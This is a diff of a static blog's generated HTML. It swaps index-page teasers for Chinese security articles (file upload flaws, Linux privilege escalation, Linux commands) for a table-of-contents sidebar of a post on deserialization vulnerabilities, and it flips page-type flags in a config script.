-    <a class="article-more-a" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">展开全文 >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Serialization%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">序列化（Serialization）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Deserialization%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">反序列化（Deserialization）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.</span> <span class="toc-text">反序列化攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">3.</span> <span class="toc-text">漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E5%9B%A0"><span class="toc-number">3.1.</span> <span class="toc-text">核心原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E5%9B%A0%E7%B4%A0"><span class="toc-number">3.2.</span> <span class="toc-text">辅助因素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">序列化与反序列化流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">3.4.</span> <span class="toc-text">攻击面分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0-%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">关键函数&#x2F;类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">PHP常用魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%BE%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">PHP举例：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">4.3.</span> <span class="toc-text">JAVA常用魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA%E4%B8%BE%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.4.</span> <span class="toc-text">JAVA举例：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8A%E5%87%BD%E6%95%B0"><span class="toc-number">4.5.</span> <span class="toc-text">Python常用魔术方法及函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA"><span class="toc-number">5.1.</span> <span class="toc-text">利用链构建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">典型攻击模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">5.3.</span> <span class="toc-text">高级利用技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">6.</span> <span class="toc-text">防御方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">6.1.</span> <span class="toc-text">安全配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8"><span class="toc-number">8.</span> <span class="toc-text">工具列表</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
 
-  
-    <article id="post-系统提权" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/" target="_blank">系统提权</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/02/12/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/" class="archive-article-date">
-        <time datetime="2025-02-12T08:11:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="关于系统提权"><a href="#关于系统提权" class="headerlink" title="关于系统提权"></a>关于系统提权</h2><p>在Linux系统中，提权(权限提升)通常是指从一个较低权限的用户账户(通常是普通用户)提升到具有更高权限的用户账户(如root用户）
-    
-    <a class="article-more-a" href="/2025/02/12/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/#more">展开全文 >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">系统提权</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
 
 
 
 
-  
-    <article id="post-linux系统命令" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/linux%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/" target="_blank">Linux系统命令</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/02/12/linux%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/" class="archive-article-date">
-        <time datetime="2025-02-12T08:11:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="关于系统命令"><a href="#关于系统命令" class="headerlink" title="关于系统命令"></a>关于系统命令</h2><p>linux系统可以通过命令行来执行命令，实现各种操作
-    
-    <a class="article-more-a" href="/2025/02/12/linux%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/#more">展开全文 >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
 
 
 
 
-  
-  
 
 
           </div>
@@ -865,8 +521,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
